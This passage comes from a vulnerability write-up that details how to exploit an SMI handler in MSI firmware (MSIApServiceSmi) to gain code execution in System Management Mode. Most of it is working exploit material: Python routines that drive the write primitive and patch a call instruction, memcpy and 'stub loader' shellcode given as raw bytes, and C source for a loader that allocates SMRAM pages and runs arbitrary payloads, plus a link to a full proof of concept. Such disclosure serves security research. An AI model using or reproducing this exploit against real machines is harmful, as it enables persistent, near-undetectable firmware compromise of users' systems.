a:  8b 48 10                mov    ecx,DWORD PTR [rax+0x10]
d:  f3 a4                   rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
f:  b0 01                   mov    al,0x1
11: c3                      ret 
```

The function expects RCX to hold an address to a struct defined as:

<div class="example">
</div>
```
class CopyMem(ctypes.Structure):
    _fields_ = [
        ("source", ctypes.c_void_p),  # void* source
        ("dest", ctypes.c_void_p),  # void* dest
        ("size", ctypes.c_uint32),  # unsigned int size
    ]
```


***fnWriteStatusToMemory*** even with the existing changes, still writes bytes as wide, which means two bytes will get changed everytime a write occurs.

The instruction responsible for this in ***fnWriteStatusToMemory***:

``movsx eax, al``

When a byte > 0x7F (let's say 0xEA) is passed to ***fnWriteStatusToMemory***, it writes `0xEA 0xFF` instead of `0xEA 0x00`.

This is because the instruction sign-extends the value in `al` to `EAX`. If `al` contains a value greater than 0x7F, then it is treated as a negative value when considered as a signed byte.


So while ***fnWriteStatusToMemory*** still writes wide-bytes, it's the perfect piece to the puzzle :

```
E8 68 EF FF FF     call    fnWriteStatusToMemory
```

can now become:

```
E8 68 [EA FF] FF   call    near ptr unk_4AA32138
```

What's at 0x4AA32138? Nothing important! (except a sweet ROP gadget, but since I don't have the ability to debug in SMM this one is worthless).

```
44 0F 6F 89 88 00 00 00                movq    mm1, qword ptr [rcx+88h]
F3 44 0F 6F 91 98 00 00 00             movdqu  xmm10, xmmword ptr [rcx+98h]
F3 44 0F 6F 99 A8 00 00 00             movdqu  xmm11, xmmword ptr [rcx+0A8h]
F3 44 0F 6F A1 B8 00 00 00             movdqu  xmm12, xmmword ptr [rcx+0B8h]
F3 44 0F 6F A9 C8 00 00 00             movdqu  xmm13, xmmword ptr [rcx+0C8h]
F3 44 0F 6F B1 D8 00 00 00             movdqu  xmm14, xmmword ptr [rcx+0D8h]
F3 44 0F 6F B9 E8 00 00 00             movdqu  xmm15, xmmword ptr [rcx+0E8h]
48 89 D0                               mov     rax, rdx
FF 61 48                               jmp     qword ptr [rcx+48h]
```

Plenty of room for the memcpy shellcode to go!

First I copy the shellcode to 0x4AA32138:

<div class="example">
</div>
```
def copy_memcpy(self):
    for idx, b in enumerate(Shellcode.MEM_COPY):
        primitive = b + b"\x00\x00\x00\x00\x00\x00\x00"
        data = self.gen_bad_var_data(
            wmi_memaddr=0x4AA32138
            - 0x2
            + idx,
            write_primitive=primitive,
        )
        self.set_wmi_var(data)
        self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
        time.sleep(0.200)
```

Now I redirect the call to `fnWriteStatusToMemory` to **0x4AA32138** by writing `0xEA 0xFF` to _0x4AA415A3_:

<div class="example">
</div>
```
def patch_call_addr(self):
    primitive = b"\xEA\x00\x00\x00\x00\x00\x00"
    data = self.gen_bad_var_data(
        wmi_memaddr=0x04AA415A3
        + 0x2   # yes, i know
        - 0x2,  # .text:000000004AA415A3 E8 68 EF FF FF => E8 68 EA FF FF
        write_primitive=primitive,
    )
    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
```

The last step is to once again overflow the global variable and this time, instead of setting `0x4AA356D8` to a byte, I set it to the physical address containing the `CopyMem()` struct:

<div class="example">
</div>
```
def copy_mem(self, source, dest, size):
    payload_address = 0x500 # any physical address with write access will do
    copy_payload = self.CopyMem()

    copy_payload.source = ctypes.c_void_p(source)
    copy_payload.dest = ctypes.c_void_p(dest)
    copy_payload.size = size

    self.cs.helper.write_phys_mem(
        payload_address, ctypes.sizeof(copy_payload), bytes(copy_payload)
    )

    primitive = payload_address.to_bytes(8, "little")

    data = self.gen_bad_var_data(write_primitive=primitive)
    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
```

The hard part is over! I can now copy data in and out of SMRAM without limitations.

One last recap of what's been done:

- "Access Denied" was zero'd out in the module's `.data` segment, allowing for a two byte (0x20 0x00 write primitive)
- Using the 0x20 0x00 primitive, the address of the first parameter passed to `fnWriteStatusToMemory` was updated - there now exists a way to write any byte(s) at an attacker controlled address to another address (albeit as a wide byte)
- Using the new primitive above, `fnWriteStatusToMemory` was modified so that `0x20 0x00` is no longer prepended to the first parameter when the function is called
- memcpy shellcode that contains no NULL bytes is written to 0x4AA32138
- The instruction which calls `fnWriteStatusToMemory` is updated to call 0x4AA32138
- A src/dest/size struct is written to a writable phyisical address
- SMI handler is called, overflowing the variable and writing the struct's address to the .data segment
- Handler execution flow is redirected to the memcpy shellcode, the memcpy struct is passed as RCX
- Shellcode executes and performs memcpy

##### Post Exploitation

I've defiled enough of MSIApServiceSmi's code - getting my own SMRAM pages would be great so that bigger payloads can be written to perform more complex work, without worrying about overwriting something important. I also prefer not to continue having to set a UEFI variable each time I want to do anything.


##### Meet Stub Loader

<div class="example">
</div>
```
__int64 stub_loader(void)
{
  PCONFIG c = (PCONFIG)(0x600);

  if (!c->CommBuffer)
  {
    return -1;
  }

  if (c->DispatchFunction)
  {
    typedef void(__stdcall* tDispatch)(PCONFIG);

    tDispatch dispatch = (tDispatch)c->DispatchFunction;
    dispatch(c); 
    return -1;
  }

  if (!c->DispatchFunction)
  {
    c->CommBuffer->ret = 0xFF;

    if (!c->CommBuffer->source || c->CommBuffer->size < 1)
    {
      c->CommBuffer->ret = 0xFE;
      return -1;
    }

    if (!c->SMST)
    {
      c->CommBuffer->ret = 0xFD;
      return -1;
    }

    UINT64 dispatch = 0;
    EFI_STATUS ret = 0;

    if (!c->SMST->SmmAllocatePages(__AllocateAnyPages, __EfiRuntimeServicesCode, 1, &dispatch))
    {
      c->DispatchFunction = dispatch;
      unsigned char* destination = (unsigned char*)c->DispatchFunction;
      for (int len = 0; len < c->CommBuffer->size; len++)
        destination[len] = ((unsigned char*)c->CommBuffer->source)[len];

      c->CommBuffer->ret = 0x0;

      return -1;
    }
    else
    {
      c->CommBuffer->ret = 0xEE;
    }
  }
  return -1;
}
```

The stub loader will read a struct at a static memory address (0x600). 

<div class="example">
</div>
```
typedef enum _ACTION {
  COPY_RAW_MEM = 0x1,
  ALLOCATE_COPY_DATA,
  ALLOCATE_COPY_EXECUTE,
  MAP_SMM_MODULE,
  UNMAP_SMM_MODULE,
  SMM_MODULE_EXEC,
  CALL,
  DISABLE_WP,
  ENABLE_WP,
  RESERVED1,
  RESERVED2,
  RESERVED3,
  PING = 0xF
} ACTION;

#pragma pack(push, 1)
typedef struct _COMBUFF {
  void* source;
  void* dest;
  unsigned int size;
  unsigned long long status;
  unsigned int action;
} COMBUFF, * PCOMBUFF;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _CONFIG {
  PCOMBUFF CommBuffer; # (say, 0x700)
  __EFI_SMM_SYSTEM_TABLE2* SMST;
  UINT64 SMRT;
  UINT64 SMBase;
  UINT64 DispatchFunction;
  UINT64 MemCpy;
  UINT64 NativeExecute;
  ...
} CONFIG, * PCONFIG;
#pragma pack(pop)
```

The `CONFIG` struct provides a way for a kernel driver (or Python script) to interact with the code in SMM. It also passes a pointer to SMST, allowing the stub to use the native edk2 function to allocate pages.

<div class="example">
</div>
```
STUB_LOADER = [
        b'\x40', b'\x57', b'\x48', b'\x83', b'\xEC', b'\x20', b'\xBF', b'\x00',
        b'\x05', b'\x00', b'\x00', b'\x48', b'\x8B', b'\x07', b'\x48', b'\x85',
        b'\xC0', b'\x0F', b'\x84', b'\xC0', b'\x00', b'\x00', b'\x00', b'\x48',
        b'\x8B', b'\x14', b'\x25', b'\x20', b'\x05', b'\x00', b'\x00', b'\x48',
        b'\x85', b'\xD2', b'\x74', b'\x09', b'\x8B', b'\xCF', b'\xFF', b'\xD2',
        b'\xE9', b'\xAA', b'\x00', b'\x00', b'\x00', b'\x48', b'\xC7', b'\x40',
        b'\x14', b'\xFF', b'\x00', b'\x00', b'\x00', b'\x48', b'\x8B', b'\x07',
        b'\x48', b'\x83', b'\x38', b'\x00', b'\x0F', b'\x84', b'\x8D', b'\x00',
        b'\x00', b'\x00', b'\x83', b'\x78', b'\x10', b'\x01', b'\x0F', b'\x82',
        b'\x83', b'\x00', b'\x00', b'\x00', b'\x4C', b'\x8B', b'\x14', b'\x25',
        b'\x08', b'\x05', b'\x00', b'\x00', b'\x4D', b'\x85', b'\xD2', b'\x75',
        b'\x0A', b'\x48', b'\xC7', b'\x40', b'\x14', b'\xFD', b'\x00', b'\x00',
        b'\x00', b'\xEB', b'\x74', b'\x48', b'\x83', b'\x64', b'\x24', b'\x30',
        b'\x00', b'\x4C', b'\x8D', b'\x4C', b'\x24', b'\x30', b'\xBA', b'\x05',
        b'\x00', b'\x00', b'\x00', b'\x33', b'\xC9', b'\x44', b'\x8D', b'\x42',
        b'\xFC', b'\x41', b'\xFF', b'\x52', b'\x60', b'\x48', b'\x8B', b'\x0C',
        b'\x25', b'\x00', b'\x05', b'\x00', b'\x00', b'\x48', b'\x85', b'\xC0',
        b'\x75', b'\x3B', b'\x4C', b'\x8B', b'\x4C', b'\x24', b'\x30', b'\x45',
        b'\x33', b'\xC0', b'\x4C', b'\x89', b'\x0C', b'\x25', b'\x20', b'\x05',
        b'\x00', b'\x00', b'\x44', b'\x39', b'\x41', b'\x10', b'\x76', b'\x1B',
        b'\x33', b'\xD2', b'\x48', b'\x8B', b'\x01', b'\x41', b'\xFF', b'\xC0',
        b'\x8A', b'\x0C', b'\x02', b'\x41', b'\x88', b'\x0C', b'\x11', b'\x48',
        b'\xFF', b'\xC2', b'\x48', b'\x8B', b'\x0F', b'\x44', b'\x3B', b'\x41',
        b'\x10', b'\x72', b'\xE7', b'\x48', b'\x8B', b'\x07', b'\x48', b'\x83',
        b'\x60', b'\x14', b'\x00', b'\xEB', b'\x12', b'\x48', b'\xC7', b'\x41',
        b'\x14', b'\xEE', b'\x00', b'\x00', b'\x00', b'\xEB', b'\x08', b'\x48',
        b'\xC7', b'\x40', b'\x14', b'\xFE', b'\x00', b'\x00', b'\x00', b'\x48',
        b'\x83', b'\xC8', b'\xFF', b'\x48', b'\x83', b'\xC4', b'\x20', b'\x5F',
        b'\xC3', b'\xCC', b'\xCC', b'\xCC',
    ]
```

`stub_loader` only has one job: allocate pages in SMRAM and copy the contents of `CommBuffer->source` to the new page. It then saves the newly allocated page address to `Config->DispatchFunction` and calls that address for all other subsequent SW SMIs. It always returns -1, which causes the vulnerable SMI handler to exit without running any other code.

I use my new memcpy code to write the `stub_loader` shellcode over `g_SetVarPtrs` address (see the very top for the SMI handler pseudocode if you missed it). This way, no call bytecode has to be modified.

<div class="example">
</div>
```
def copy_stub_loader(self):
    shellcode_size = len(Shellcode.STUB_LOADER)
    self.cs.helper.write_phys_mem(self.ShellCodeBufferAddress, shellcode_size, b''.join(Shellcode.STUB_LOADER))

    combuffer = COMBUFF()
    combuffer.source = self.ShellCodeBufferAddress
    combuffer.size = shellcode_size
    combuffer.dest = self.StubAddress #g_SetVarPtrs

    self.cs.helper.write_phys_mem(
            self.ComBuffAddress, ctypes.sizeof(COMBUFF), bytes(combuffer))

    config = self.gen_config()

    self.cs.helper.write_phys_mem(
            self.ConfigAddress, ctypes.sizeof(CONFIG), bytes(config))

    print("Config written to " + hex(self.ConfigAddress))
    print("Commbuffer @ " + hex(self.ComBuffAddress))
    print("Stub loader shellcode @ " + hex(self.ShellCodeBufferAddress))
    print("Stomping all over " + hex(self.StubAddress))

    primitive = self.ComBuffAddress.to_bytes(8, "little") # essentially the same as CopyMem()
    data = self.gen_bad_var_data(write_primitive=primitive)

    self.set_wmi_var(data)

    self.interupts.send_SW_SMI(0x0, 0xE3, 0, 0, 0, 0, 0, 0, 0)
```

The next SMI call will now call `stub_loader` instead, which will then kick off page allocation and perform the final shellcode copy. And that's it! No more having to set UEFI variables or fighting with wide bytes.

## The POC
Find the POC (in kernel driver form) on [GitHub](https://github.com/jjensn/CVE-2024-36877).






